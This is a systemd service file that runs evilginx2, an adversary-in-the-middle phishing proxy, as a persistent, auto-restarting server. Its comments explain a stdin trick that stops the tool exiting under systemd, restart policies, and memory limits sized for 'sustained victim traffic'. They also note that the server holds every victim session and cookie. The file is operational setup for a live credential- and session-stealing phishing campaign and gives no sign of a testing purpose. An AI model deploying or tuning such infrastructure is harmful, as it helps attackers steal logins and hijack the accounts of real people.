[Unit]
Description=evilginx2 phishing server (systemd-managed, auto-restart)
Documentation=https://github.com/kgretzky/evilginx2
# Only start once the network is actually up (evilginx binds :80/:443/:53)
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
# Run as the user who OWNS the evilginx config (~/.evilginx). Critical: if the
# service runs as root while the config was created under another user, lures,
# domain, and phishlet hostnames all load EMPTY ("fail to load lure"). Set
# __RUN_USER__ to the user who has been running evilginx (usually the SSH user
# or 'root' on the VPS).
User=__RUN_USER__
WorkingDirectory=__PROJECT_DIR__
# -c pins the config directory so it never drifts to the wrong user's home.
# -p points at the phishlets. __CFG_DIR__ is usually /home/<user>/.evilginx
# (or /root/.evilginx when running as root).
# CRITICAL stdin trick: evilginx's main loop is a REPL that reads from stdin.
# Under systemd stdin is closed -> readline hits EOF -> process exits 0
# immediately ("activating (auto-restart)" / status=0/SUCCESS). We feed it a
# pipe that never EOFs via process substitution (< <(sleep infinity)). `exec`
# keeps evilginx as the main PID, so systemd still tracks and auto-restarts
# the REAL process on crash/panic/OOM.
ExecStart=/bin/bash -c 'exec __PROJECT_DIR__/evilginx -c __CFG_DIR__ -p __PROJECT_DIR__/phishlets --dashboard < <(sleep infinity)'

# ---------------------------------------------------------------
# THE critical setting: restart on ANY death (crash, panic, OOM-kill,
# signal, out-of-memory from the kernel killer). This is what tmux
# does NOT do. 5s backoff avoids restart storms.
# ---------------------------------------------------------------
Restart=always
RestartSec=5

# Allow rapid restart cycles without the systemd start-limit tripping.
StartLimitIntervalSec=0
StartLimitBurst=0

# Graceful-ish stop: give it time to persist DB before SIGKILL.
KillSignal=SIGTERM
TimeoutStopSec=15
KillMode=mixed

# ---------------------------------------------------------------
# Memory guardrails. evilginx holds every session + cookie + log in
# RAM (buntdb). Under sustained victim traffic RSS grows over days.
# MemoryMax caps it: the kernel kills the process instead of OOMing
# the whole VPS — and Restart=always brings it right back. This is the
# "dies after running for a long time" fix. Raise if you run hundreds
# of sessions at once; the tradeoff is a restart (sessions persist on
# disk in the config dir, so nothing is lost).
# NOTE: too LOW a ceiling causes restart loops (dash keeps logging out /
# "fails to fetch" during the restart window). 4G is generous for a
# phishing server; lower only if the box has little RAM.
# ---------------------------------------------------------------
MemoryHigh=3G
MemoryMax=4G

# Lots of concurrent proxied connections + DNS sockets.
LimitNOFILE=65536

# Log to journald (durable, survives the process dying, queryable).
StandardOutput=journal
StandardError=journal
# Don't kill the box if the binary writes a core dump on panic.
LimitCORE=0

[Install]
WantedBy=multi-user.target
